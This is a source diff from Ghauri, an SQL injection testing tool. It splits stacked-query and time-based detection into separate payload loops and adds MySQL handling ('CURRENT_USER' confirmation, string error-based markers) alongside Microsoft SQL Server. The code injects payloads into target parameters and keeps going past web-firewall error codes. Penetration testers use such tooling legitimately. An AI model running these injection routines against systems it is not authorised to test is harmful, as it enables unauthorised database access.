@@ -918,12 +918,19 @@ def check_timebased_sqli(
             "is_different_status_code_injectable",
         ],
     )
+    stack_queries_payloads = fetch_db_specific_payload(
+        dbms=dbms,
+        booleanbased_only=False,
+        timebased_only=False,
+        stack_queries_only=bool("S" in techniques),
+    )
     time_based_payloads = fetch_db_specific_payload(
         dbms=dbms,
         booleanbased_only=False,
         timebased_only=bool("T" in techniques),
-        stack_queries_only=bool("S" in techniques),
+        stack_queries_only=False,
     )
+    payloads_response_delay = [stack_queries_payloads, time_based_payloads]
     param_key = parameter.get("key")
     param_value = parameter.get("value")
     sleep_time = random.randint(5, 9)
@@ -936,194 +943,197 @@ def check_timebased_sqli(
     terminate_on_web_firewall = False
     http_firewall_code_counter = 0
     error_msg = None
-    for entry in time_based_payloads:
-        backend = entry.dbms
-        index_of_payload = 0
-        retry_on_error = 0
-        if terminate_on_web_firewall:
-            break
-        if terminate_on_errors:
-            break
-        payloads = fetch_payloads_by_suffix_prefix(
-            payloads=entry.payloads, prefix=prefix, suffix=suffix
-        )
-        total_payloads = len(payloads)
-        logger.info(f"testing '{entry.title}'")
-        while index_of_payload < total_payloads:
-            if http_firewall_code_counter > 2:
-                message = f"{error_msg} - {http_firewall_code_counter} time(s)"
-                logger.warning(f"HTTP error code detected during run:")
-                choice = logger.read_input(
-                    f"{message}. Do you want to keep testing the others (if any) [y/N]? ",
-                    batch=False,
-                    user_input="N",
-                )
-                if choice == "n":
-                    terminate_on_web_firewall = True
-                    break
-                if choice == "y":
-                    http_firewall_code_counter = 0
-            if retry_on_error >= retry:
-                logger.warning(f"Ghauri detected connection errors multiple times")
-                choice = logger.read_input(
-                    f"Do you want to keep testing the others (if any) [y/N]? ",
-                    batch=False,
-                    user_input="N",
-                )
-                if choice == "n":
-                    terminate_on_errors = True
-                    break
-                if choice == "y":
-                    retry_on_error = 0
-            if delay > 0:
-                time.sleep(delay)
-            _payload = payloads[index_of_payload]
-            string = _payload.string
-            expression = string.replace("[SLEEPTIME]", "%s" % (sleep_time))
-            decoded_expression = urldecode(expression)
-            logger.payload(f"{decoded_expression}")
-            try:
-                attack = inject_expression(
-                    url=url,
-                    data=data,
-                    proxy=proxy,
-                    delay=delay,
-                    timesec=timesec,
-                    timeout=timeout,
-                    headers=headers,
-                    parameter=parameter,
-                    expression=expression,
-                    is_multipart=is_multipart,
-                    injection_type=injection_type,
-                )
-                index_of_payload += 1
-                retry_on_error = 0
-            except KeyboardInterrupt:
-                logger.warning("user aborted during detection phase")
-                quest = logger.read_input(
-                    "how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(q)uit] ",
-                    batch=False,
-                    user_input="S",
-                )
-                if quest and quest == "n":
-                    # later on will handle this nicely..
-                    return "next parameter"
-                if quest and quest == "q":
-                    logger.error("user quit")
-                    logger.end("ending")
-                    exit(0)
-                if quest and quest == "e":
-                    end_detection_phase = True
-                if quest and quest == "s":
-                    break
-            except ConnectionAbortedError as e:
-                logger.critical(
-                    f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
-                )
-                retry_on_error += 1
-            except ConnectionRefusedError as e:
-                logger.critical(
-                    f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
-                )
-                retry_on_error += 1
-            except ConnectionResetError as e:
-                logger.critical(
-                    f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
-                )
-                retry_on_error += 1
-            except Exception as error:
-                logger.critical(
-                    f"error {error}, during detection phase. Ghauri is going to retry"
-                )
-                retry_on_error += 1
-            response_time = attack.response_time
-            if response_time < sleep_time and end_detection_phase:
-                return None
-            requests_counter += 1
-            with_status_code_msg = ""
-            with_status_code = attack.status_code
-            if attack.status_code != base.status_code:
-                is_different_status_code_injectable = True
-                if with_status_code == 4001:
-                    with_status_code_msg = (
-                        f" (with error ReadTimeout on --timeout={timeout})"
+    for payloads_delay in payloads_response_delay:
+        for entry in payloads_delay:
+            backend = entry.dbms
+            index_of_payload = 0
+            retry_on_error = 0
+            if terminate_on_web_firewall:
+                break
+            if terminate_on_errors:
+                break
+            payloads = fetch_payloads_by_suffix_prefix(
+                payloads=entry.payloads, prefix=prefix, suffix=suffix
+            )
+            total_payloads = len(payloads)
+            logger.info(f"testing '{entry.title}'")
+            while index_of_payload < total_payloads:
+                if http_firewall_code_counter > 2:
+                    message = f"{error_msg} - {http_firewall_code_counter} time(s)"
+                    logger.warning(f"HTTP error code detected during run:")
+                    choice = logger.read_input(
+                        f"{message}. Do you want to keep testing the others (if any) [y/N]? ",
+                        batch=False,
+                        user_input="N",
                     )
-                else:
-                    with_status_code_msg = f" (with --code={with_status_code})"
-            if attack.status_code in [403, 406] and code and code not in [403, 406]:
-                logger.critical(
-                    f"{attack.error_msg} HTTP error code detected. ghauri is going to retry."
-                )
-                time.sleep(0.5)
-                error_msg = attack.error_msg
-                http_firewall_code_counter += 1
-                continue
-            logger.debug(f"sleep time: {sleep_time}, response time: {response_time}")
-            if response_time >= sleep_time:
-                is_injected = True
-                _it = injection_type
-                if param_key == "#1*":
-                    _it = "URI"
-                if is_multipart:
-                    message = f"(custom) {injection_type} parameter '{mc}MULTIPART {param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
-                elif is_json:
-                    message = f"(custom) {injection_type} parameter '{mc}JSON {param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
-                else:
-                    message = f"{_it} parameter '{mc}{param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
-                if with_status_code_msg and "ReadTimeout" in with_status_code_msg:
-                    logger.warning(
-                        "in case of read timeout performing further tests to confirm if the detected payload is working.."
+                    if choice == "n":
+                        terminate_on_web_firewall = True
+                        break
+                    if choice == "y":
+                        http_firewall_code_counter = 0
+                if retry_on_error >= retry:
+                    logger.warning(f"Ghauri detected connection errors multiple times")
+                    choice = logger.read_input(
+                        f"Do you want to keep testing the others (if any) [y/N]? ",
+                        batch=False,
+                        user_input="N",
                     )
-                    ok = confirm_timebased_sqli(
-                        base,
-                        parameter,
-                        _payload,
-                        sleep_time,
-                        response_time,
+                    if choice == "n":
+                        terminate_on_errors = True
+                        break
+                    if choice == "y":
+                        retry_on_error = 0
+                if delay > 0:
+                    time.sleep(delay)
+                _payload = payloads[index_of_payload]
+                string = _payload.string
+                expression = string.replace("[SLEEPTIME]", "%s" % (sleep_time))
+                decoded_expression = urldecode(expression)
+                logger.payload(f"{decoded_expression}")
+                try:
+                    attack = inject_expression(
                         url=url,
                         data=data,
-                        headers=headers,
-                        injection_type=injection_type,
                         proxy=proxy,
-                        is_multipart=is_multipart,
-                        timeout=timeout,
                         delay=delay,
                         timesec=timesec,
-                        is_read_timedout=True,
-                        vector=f"{_payload.prefix}{entry.vector}{_payload.suffix}",
+                        timeout=timeout,
+                        headers=headers,
+                        parameter=parameter,
+                        expression=expression,
+                        is_multipart=is_multipart,
+                        injection_type=injection_type,
                     )
-                    if not ok.vulnerable:
-                        logger.warning(
-                            "false positive payload detected with read timeout continue testing.."
+                    index_of_payload += 1
+                    retry_on_error = 0
+                except KeyboardInterrupt:
+                    logger.warning("user aborted during detection phase")
+                    quest = logger.read_input(
+                        "how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(q)uit] ",
+                        batch=False,
+                        user_input="S",
+                    )
+                    if quest and quest == "n":
+                        # later on will handle this nicely..
+                        return "next parameter"
+                    if quest and quest == "q":
+                        logger.error("user quit")
+                        logger.end("ending")
+                        exit(0)
+                    if quest and quest == "e":
+                        end_detection_phase = True
+                    if quest and quest == "s":
+                        break
+                except ConnectionAbortedError as e:
+                    logger.critical(
+                        f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
+                    )
+                    retry_on_error += 1
+                except ConnectionRefusedError as e:
+                    logger.critical(
+                        f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
+                    )
+                    retry_on_error += 1
+                except ConnectionResetError as e:
+                    logger.critical(
+                        f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
+                    )
+                    retry_on_error += 1
+                except Exception as error:
+                    logger.critical(
+                        f"error {error}, during detection phase. Ghauri is going to retry"
+                    )
+                    retry_on_error += 1
+                response_time = attack.response_time
+                if response_time < sleep_time and end_detection_phase:
+                    return None
+                requests_counter += 1
+                with_status_code_msg = ""
+                with_status_code = attack.status_code
+                if attack.status_code != base.status_code:
+                    is_different_status_code_injectable = True
+                    if with_status_code == 4001:
+                        with_status_code_msg = (
+                            f" (with error ReadTimeout on --timeout={timeout})"
                         )
-                        continue
-                logger.notice(message)
-                _url = attack.request_url if injection_type == "GET" else attack.url
-                _temp = Response(
-                    url=_url,
-                    data=attack.data,
-                    path=attack.path,
-                    title=entry.title,
-                    param=parameter,
-                    payload=expression,
-                    base=base._asdict(),
-                    prefix=_payload.prefix,
-                    suffix=_payload.suffix,
-                    vector=entry.vector,
-                    attacks=attack._asdict(),
-                    injection_type=injection_type,
-                    sleep_time=sleep_time,
-                    response_time=response_time,
-                    injected=is_injected,
-                    prepared_vector=f"{_payload.prefix}{entry.vector}{_payload.suffix}",
-                    number_of_requests=requests_counter,
-                    backend=backend,
-                    payload_type="time-based blind",
-                    payload_raw=_payload,
-                    with_status_code=with_status_code,
-                    is_different_status_code_injectable=is_different_status_code_injectable,
+                    else:
+                        with_status_code_msg = f" (with --code={with_status_code})"
+                if attack.status_code in [403, 406] and code and code not in [403, 406]:
+                    logger.critical(
+                        f"{attack.error_msg} HTTP error code detected. ghauri is going to retry."
+                    )
+                    time.sleep(0.5)
+                    error_msg = attack.error_msg
+                    http_firewall_code_counter += 1
+                    continue
+                logger.debug(
+                    f"sleep time: {sleep_time}, response time: {response_time}"
                 )
-                return _temp
+                if response_time >= sleep_time:
+                    is_injected = True
+                    _it = injection_type
+                    if param_key == "#1*":
+                        _it = "URI"
+                    if is_multipart:
+                        message = f"(custom) {injection_type} parameter '{mc}MULTIPART {param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
+                    elif is_json:
+                        message = f"(custom) {injection_type} parameter '{mc}JSON {param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
+                    else:
+                        message = f"{_it} parameter '{mc}{param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
+                    if with_status_code_msg and "ReadTimeout" in with_status_code_msg:
+                        logger.warning(
+                            "in case of read timeout performing further tests to confirm if the detected payload is working.."
+                        )
+                        ok = confirm_timebased_sqli(
+                            base,
+                            parameter,
+                            _payload,
+                            sleep_time,
+                            response_time,
+                            url=url,
+                            data=data,
+                            headers=headers,
+                            injection_type=injection_type,
+                            proxy=proxy,
+                            is_multipart=is_multipart,
+                            timeout=timeout,
+                            delay=delay,
+                            timesec=timesec,
+                            is_read_timedout=True,
+                            vector=f"{_payload.prefix}{entry.vector}{_payload.suffix}",
+                        )
+                        if not ok.vulnerable:
+                            logger.warning(
+                                "false positive payload detected with read timeout continue testing.."
+                            )
+                            continue
+                    logger.notice(message)
+                    _url = attack.request_url if injection_type == "GET" else attack.url
+                    _temp = Response(
+                        url=_url,
+                        data=attack.data,
+                        path=attack.path,
+                        title=entry.title,
+                        param=parameter,
+                        payload=expression,
+                        base=base._asdict(),
+                        prefix=_payload.prefix,
+                        suffix=_payload.suffix,
+                        vector=entry.vector,
+                        attacks=attack._asdict(),
+                        injection_type=injection_type,
+                        sleep_time=sleep_time,
+                        response_time=response_time,
+                        injected=is_injected,
+                        prepared_vector=f"{_payload.prefix}{entry.vector}{_payload.suffix}",
+                        number_of_requests=requests_counter,
+                        backend=backend,
+                        payload_type="time-based blind",
+                        payload_raw=_payload,
+                        with_status_code=with_status_code,
+                        is_different_status_code_injectable=is_different_status_code_injectable,
+                    )
+                    return _temp
     return None
 
 
@@ -1319,53 +1329,61 @@ def check_errorbased_sqli(
                         "confirmating if target is actually exploiable or not.."
                     )
                     _pv = f"{_payload.prefix}{entry.vector}{_payload.suffix}"
-                    _expression = _pv.replace("[INFERENCE]", "(SELECT%20DB_NAME())")
-                    logger.payload(f"{urldecode(_expression)}")
-                    try:
-                        _attack = inject_expression(
-                            url=url,
-                            data=data,
-                            proxy=proxy,
-                            delay=delay,
-                            timesec=timesec,
-                            timeout=timeout,
-                            headers=headers,
-                            parameter=parameter,
-                            expression=_expression,
-                            is_multipart=is_multipart,
-                            injection_type=injection_type,
-                        )
-                        retval_confirm = search_regex(
-                            pattern=(
-                                r"(?isx)(?:(?:r0oth3x49|START)~(?P<error_based_response>.*?)\~END)",
-                                REGEX_GENERIC,
-                                REGEX_MSSQL_STRING,
-                            ),
-                            string=_attack.text,
-                            group="error_based_response",
-                            default=None,
-                        )
-                        if retval_confirm and retval_confirm != "<blank_value>":
-                            is_string = True
-                            logger.debug(
-                                f"reflective value found in response, filtering out"
+                    pl = (
+                        "(SELECT DB_NAME())"
+                        if backend == "Microsoft SQL Server"
+                        else None
+                    )
+                    if not pl:
+                        pl = "CURRENT_USER" if backend == "MySQL" else None
+                    if pl:
+                        _expression = _pv.replace("[INFERENCE]", pl)
+                        logger.payload(f"{urldecode(_expression)}")
+                        try:
+                            _attack = inject_expression(
+                                url=url,
+                                data=data,
+                                proxy=proxy,
+                                delay=delay,
+                                timesec=timesec,
+                                timeout=timeout,
+                                headers=headers,
+                                parameter=parameter,
+                                expression=_expression,
+                                is_multipart=is_multipart,
+                                injection_type=injection_type,
                             )
-                            logger.debug(f"retrieved: '{retval_confirm}'")
-                        else:
-                            logger.debug(
-                                "false positive payload detected, continue testing more.."
+                            retval_confirm = search_regex(
+                                pattern=(
+                                    r"(?isx)(?:(?:r0oth3x49|START)~(?P<error_based_response>.*?)\~END)",
+                                    REGEX_GENERIC,
+                                    REGEX_MSSQL_STRING,
+                                ),
+                                string=_attack.text,
+                                group="error_based_response",
+                                default=None,
+                            )
+                            if retval_confirm and retval_confirm != "<blank_value>":
+                                is_string = True
+                                logger.debug(
+                                    f"reflective value found in response, filtering out"
+                                )
+                                logger.debug(f"retrieved: '{retval_confirm}'")
+                            else:
+                                logger.debug(
+                                    "false positive payload detected, continue testing more.."
+                                )
+                                continue
+                        except KeyboardInterrupt:
+                            logger.warning(
+                                "user aborted during string error-based 'Microsoft SQL Server' injection confirmation"
                             )
                             continue
-                    except KeyboardInterrupt:
-                        logger.warning(
-                            "user aborted during string error-based 'Microsoft SQL Server' injection confirmation"
-                        )
-                        continue
-                    except Exception as error:
-                        logger.critical(
-                            f"error {error}, during string error-based 'Microsoft SQL Server' injection confirmation.."
-                        )
-                        continue
+                        except Exception as error:
+                            logger.critical(
+                                f"error {error}, during string error-based 'Microsoft SQL Server' injection confirmation.."
+                            )
+                            continue
                 _it = injection_type
                 if param_key == "#1*":
                     _it = "URI"
@@ -1574,6 +1592,14 @@ def check_session(
                 string = "r0oth3x49"
                 regex = r"(?is)(?:r0oth3x49)"
                 if backend == "Microsoft SQL Server":
+                    if "string error-based" in title:
+                        to_str = is_string = True
+                    if is_string:
+                        string = "r0ot"
+                        regex = r"(?is)(?:r0ot)"
+                    else:
+                        to_char = not is_string
+                if backend == "MySQL":
                     if "string error-based" in title:
                         to_str = is_string = True
                     if is_string:
